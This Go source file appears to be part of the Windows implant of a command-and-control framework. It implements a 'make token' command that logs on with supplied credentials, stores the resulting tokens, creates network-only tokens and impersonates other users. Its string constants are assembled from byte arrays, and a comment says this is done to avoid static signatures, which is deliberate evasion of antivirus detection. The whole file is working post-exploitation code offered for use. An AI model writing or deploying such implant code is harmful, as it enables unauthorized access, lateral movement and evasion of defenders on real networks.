// server/docker/payloads/Windows/action_make_token_windows.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Make token strings (constructed to avoid static signatures)
var (
	mtBackslash       = string([]byte{0x5c})                                                                                     // \
	mtAtSign          = string([]byte{0x40})                                                                                     // @
	mtDot             = string([]byte{0x2e})                                                                                     // .
	mtNetwork         = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b})                                                 // network
	mtBatch           = string([]byte{0x62, 0x61, 0x74, 0x63, 0x68})                                                             // batch
	mtService         = string([]byte{0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                 // service
	mtNetCleartext    = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x5f, 0x63, 0x6c, 0x65, 0x61, 0x72, 0x74, 0x65, 0x78, 0x74}) // network_cleartext
	mtNetClear        = string([]byte{0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b, 0x5f, 0x63, 0x6c, 0x65, 0x61, 0x72})             // network_clear
	mtNewCredentials  = string([]byte{0x6e, 0x65, 0x77, 0x5f, 0x63, 0x72, 0x65, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x61, 0x6c, 0x73}) // new_credentials
	mtNewCreds        = string([]byte{0x6e, 0x65, 0x77, 0x63, 0x72, 0x65, 0x64, 0x73})                                           // newcreds
	mtInteractive     = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x72, 0x61, 0x63, 0x74, 0x69, 0x76, 0x65})                         // interactive
	mtSourceCreated   = string([]byte{0x63})                                                                                     // c (source for created tokens)
	mtSourceCompare   = string([]byte{0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64})                                                 // created
	mtTokenTypePrimary = string([]byte{0x70, 0x72, 0x69, 0x6d, 0x61, 0x72, 0x79})                                                // primary
	mtUnknown         = string([]byte{0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e})                                                 // Unknown
)

// MakeTokenCommand handles Windows token creation with credentials (kept for delegation from TokenCommand)
type MakeTokenCommand struct{}

func (c *MakeTokenCommand) createToken(ctx *CommandContext, userStr string, password string, tokenName string, logonTypeStr string) CommandResult {
	// Parse domain\user or just user
	var domain, user string
	if strings.Contains(userStr, mtBackslash) {
		parts := strings.SplitN(userStr, mtBackslash, 2)
		domain = parts[0]
		user = parts[1]
	} else if strings.Contains(userStr, mtAtSign) {
		// UPN format
		user = userStr
		domain = ""
	} else {
		// Local user
		user = userStr
		domain = mtDot
	}

	// Map logon type string to constant
	logonType := LOGON32_LOGON_INTERACTIVE
	switch strings.ToLower(logonTypeStr) {
	case mtNetwork:
		logonType = LOGON32_LOGON_NETWORK
	case mtBatch:
		logonType = LOGON32_LOGON_BATCH
	case mtService:
		logonType = LOGON32_LOGON_SERVICE
	case mtNetCleartext, mtNetClear:
		logonType = LOGON32_LOGON_NETWORK_CLEARTEXT
	case mtNewCredentials, mtNewCreds:
		logonType = LOGON32_LOGON_NEW_CREDENTIALS
	case mtInteractive:
		logonType = LOGON32_LOGON_INTERACTIVE
	default:
		logonType = LOGON32_LOGON_INTERACTIVE
	}


	// Convert strings to UTF16
	userUTF16, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	domainUTF16, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	passwordUTF16, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call LogonUser
	var token syscall.Handle
	ret, _, _ := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userUTF16)),
		uintptr(unsafe.Pointer(domainUTF16)),
		uintptr(unsafe.Pointer(passwordUTF16)),
		uintptr(logonType),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		return CommandResult{
			Output:      Err(E40),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store token in unified store
	if globalTokenStore == nil {
		globalTokenStore = &UnifiedTokenStore{
			Tokens:   make(map[string]syscall.Handle),
			Metadata: make(map[string]TokenMetadata),
		}
	}

	globalTokenStore.mu.Lock()

	// Close existing token with same name if it exists
	if existingToken, exists := globalTokenStore.Tokens[tokenName]; exists {
		CloseHandle(existingToken)
	}

	// Store the token
	globalTokenStore.Tokens[tokenName] = token
	globalTokenStore.Metadata[tokenName] = TokenMetadata{
		User:      user,
		Domain:    domain,
		Source:    mtSourceCreated,
		LogonType: logonTypeStr,
		StoredAt:  time.Now(),
		TokenType: mtTokenTypePrimary,
		NetOnly:   false,
	}

	// Save original user info if not already saved
	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S1, tokenName),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) createNetOnlyToken(ctx *CommandContext, userStr string, password string, tokenName string) CommandResult {
	// Parse domain\user
	var domain, user string
	if strings.Contains(userStr, mtBackslash) {
		parts := strings.SplitN(userStr, mtBackslash, 2)
		domain = parts[0]
		user = parts[1]
	} else {
		user = userStr
		domain = mtDot
	}


	// Convert strings to UTF16
	userUTF16, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	domainUTF16, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	passwordUTF16, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Call LogonUser with NEW_CREDENTIALS
	var token syscall.Handle
	ret, _, _ := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userUTF16)),
		uintptr(unsafe.Pointer(domainUTF16)),
		uintptr(unsafe.Pointer(passwordUTF16)),
		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		return CommandResult{
			Output:      Err(E40),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Store token
	if globalTokenStore == nil {
		globalTokenStore = &UnifiedTokenStore{
			Tokens:   make(map[string]syscall.Handle),
			Metadata: make(map[string]TokenMetadata),
		}
	}

	globalTokenStore.mu.Lock()

	if existingToken, exists := globalTokenStore.Tokens[tokenName]; exists {
		CloseHandle(existingToken)
	}

	globalTokenStore.Tokens[tokenName] = token
	globalTokenStore.Metadata[tokenName] = TokenMetadata{
		User:      user,
		Domain:    domain,
		Source:    mtSourceCreated,
		LogonType: mtNewCredentials,
		StoredAt:  time.Now(),
		TokenType: mtTokenTypePrimary,
		NetOnly:   true, // Mark as network-only
	}

	if globalTokenStore.OriginalUser == "" {
		originalUser, originalDomain := c.getCurrentUserInfo()
		globalTokenStore.OriginalUser = originalUser
		globalTokenStore.OriginalDomain = originalDomain
	}

	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S1, tokenName),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) impersonateToken(ctx *CommandContext) CommandResult {
	if globalTokenStore == nil {
		return CommandResult{
			Output:      Err(E46),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	globalTokenStore.mu.RLock()

	// Find the most recent "created" token that is NOT netonly
	var foundToken syscall.Handle
	var foundName string

	for name, metadata := range globalTokenStore.Metadata {
		if metadata.Source == mtSourceCompare && !metadata.NetOnly {
			if token, exists := globalTokenStore.Tokens[name]; exists {
				foundToken = token
				foundName = name
				break
			}
		}
	}
	globalTokenStore.mu.RUnlock()

	if foundToken == 0 {
		return CommandResult{
			Output:      Err(E47),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Revert any current impersonation first
	RevertToSelf()

	// Duplicate as impersonation token
	var impersonationToken syscall.Handle
	err := DuplicateTokenEx(
		foundToken,
		TOKEN_ALL_ACCESS,
		nil,
		SecurityImpersonation,
		TokenImpersonation,
		&impersonationToken,
	)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer CloseHandle(impersonationToken)

	// Impersonate the token
	err = ImpersonateLoggedOnUser(impersonationToken)
	if err != nil {
		return CommandResult{
			Output:      Err(E42),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update global state
	globalTokenStore.mu.Lock()
	globalTokenStore.IsImpersonating = true
	globalTokenStore.ActiveToken = foundName
	globalTokenStore.mu.Unlock()

	return CommandResult{
		Output:      SuccCtx(S4, foundName),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *MakeTokenCommand) clearTokens(ctx *CommandContext) CommandResult {
	if globalTokenStore == nil {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	globalTokenStore.mu.Lock()
	defer globalTokenStore.mu.Unlock()

	// Find and remove all "created" tokens
	var clearedCount int

	for name, metadata := range globalTokenStore.Metadata {
		if metadata.Source == mtSourceCompare {
			// Check if this is the active network-only token
			if globalTokenStore.NetOnlyToken == name {
				globalTokenStore.NetOnlyToken = ""
				globalTokenStore.NetOnlyHandle = 0
			}

			// Check if this is the active impersonation token
			if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
				RevertToSelf()
				globalTokenStore.IsImpersonating = false
				globalTokenStore.ActiveToken = ""
			}

			if token, exists := globalTokenStore.Tokens[name]; exists {
				CloseHandle(token)
				delete(globalTokenStore.Tokens, name)
				delete(globalTokenStore.Metadata, name)
				clearedCount++
			}
		}
	}

	if clearedCount == 0 {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S2, strconv.Itoa(clearedCount)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *MakeTokenCommand) getCurrentUserInfo() (string, string) {
	token, err := syscall.OpenCurrentProcessToken()
	if err == nil {
		defer token.Close()
		if user, domain := c.getTokenUserInfo(syscall.Handle(token)); user != mtUnknown {
			return user, domain
		}
	}
	return mtUnknown, mtUnknown
}

func (c *MakeTokenCommand) getTokenUserInfo(token syscall.Handle) (string, string) {
	var needed uint32
	procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		0,
		0,
		uintptr(unsafe.Pointer(&needed)),
	)

	if needed == 0 {
		return mtUnknown, ""
	}

	buffer := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(token),
		1, // TokenUser
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(needed),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return mtUnknown, ""
	}

	tokenUser := (*TokenUser)(unsafe.Pointer(&buffer[0]))

	var nameSize, domainSize uint32 = 256, 256
	nameBuffer := make([]uint16, nameSize)
	domainBuffer := make([]uint16, domainSize)
	var use uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0,
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domainBuffer[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&use)),
	)

	if ret == 0 {
		return mtUnknown, ""
	}

	return syscall.UTF16ToString(nameBuffer), syscall.UTF16ToString(domainBuffer)
}

func (c *MakeTokenCommand) getLogonErrorMessage(errorCode syscall.Errno) string {
	// Return error code with Windows error hex for client-side translation
	return ErrCtx(E40, fmt.Sprintf("0x%X", errorCode))
}
